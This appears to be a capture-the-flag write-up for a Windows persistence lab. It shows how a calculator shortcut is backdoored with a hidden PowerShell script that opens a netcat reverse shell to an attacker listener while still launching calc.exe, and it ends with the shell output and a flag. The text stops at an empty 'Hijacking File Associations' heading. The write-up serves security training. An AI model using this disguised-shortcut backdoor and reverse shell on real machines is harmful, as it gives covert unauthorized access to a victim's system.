# Shortcut Files
1. Started up this room's machine
2. Opened up the compromised Windows machine's calculator properties

![]()

![]()

3. `PowerShell`
```PowerShell
```
4. `$scriptPath = 'C:\Windows\System32\<SCRIPT NAME>.ps1'`
5. `$scriptContent = @"`
6. `Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe <MACHINE IP> <PORT NUMBER>"`
7. `C:\Windows\System32\calc.exe`
8. `"@` 
9. `Set-Content -Path $scriptPath -Value $scriptContent`
```PowerShell
PS C:\Users\Administrator> $scriptPath = 'C:\Windows\System32\BackdoorScript.ps1'
>> $scriptContent = @"
>> Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe 10.10.210.65 9999"
>> C:\Windows\System32\calc.exe
>> "@
>> Set-Content -Path $scriptPath -Value $scriptContent
>>
```
5. Change the calculator's icon and shortcut properties to 'powershell.exe -WindowStyle hidden C:\Windows\System32\<SCRIPT NAME>.ps1'

![]()

![]()

6. `nc -lvnp <PORT NUMBER>`
```Bash
root@ip-10-10-210-65:~# nc -lnvp 9999
Listening on [0.0.0.0] (family 0, port 9999)
```
7. Click on the calculator

![]()

```Bash
root@ip-10-10-210-65:~# nc -lnvp 9999
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.105.224 49982 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
8. `C:\flags\flag5.exe`
```Bash
C:\Windows\system32>C:\flags\flag5.exe
C:\flags\flag5.exe
THM{NO_SHORTCUTS_IN_LIFE}
```

# Hijacking File Associations
1. Started this room's machine
2. 
